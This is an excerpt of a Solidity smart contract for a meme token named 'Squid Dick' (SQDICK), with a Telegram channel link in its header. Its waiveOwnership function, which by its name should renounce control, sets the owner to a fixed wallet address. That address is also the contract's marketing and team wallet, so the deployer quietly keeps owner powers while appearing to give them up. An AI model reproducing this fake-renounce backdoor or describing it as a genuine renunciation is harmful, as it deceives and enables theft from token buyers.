...
/**
Telegram : https://t.me/SquidDickBSC
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb42a20bECC207559eCF539A705df85076db1d738);
    }
...
contract SquidDick is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Squid Dick";
    string private _symbol = "SQDICK";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xb42a20bECC207559eCF539A705df85076db1d738);
    address payable private teamWalletAddress = payable(0xb42a20bECC207559eCF539A705df85076db1d738);
